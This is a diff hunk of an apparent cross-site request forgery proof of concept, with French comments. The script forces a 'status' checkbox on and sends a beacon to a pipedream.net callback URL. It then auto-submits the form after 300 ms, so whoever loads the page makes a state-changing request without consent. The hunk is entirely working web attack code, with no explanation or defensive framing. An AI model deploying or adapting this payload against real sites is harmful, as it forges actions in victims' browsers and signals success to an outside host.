@@ -5,10 +5,10 @@
   <input type="checkbox" name="status" value="on" checked>
 </form>
 <script>
-  // Ping d'abord
-  new Image().src = "https://eo24g6niho492nt.m.pipedream.net/ping?ok=1&ts=" + Date.now();
-  // Puis soumettre après un petit délai
-  setTimeout(function() {
-    document.forms[0].submit();
-  }, 300);
+  // Coche + ping enchaîné
+  let cb = document.querySelector('input[name="status"]');
+  cb.checked = true;
+  new Image().src = "https://eo24g6niho492nt.m.pipedream.net/ping?ts=" + Date.now();
+  setTimeout(()=>document.forms[0].submit(), 300);
 </script>
+
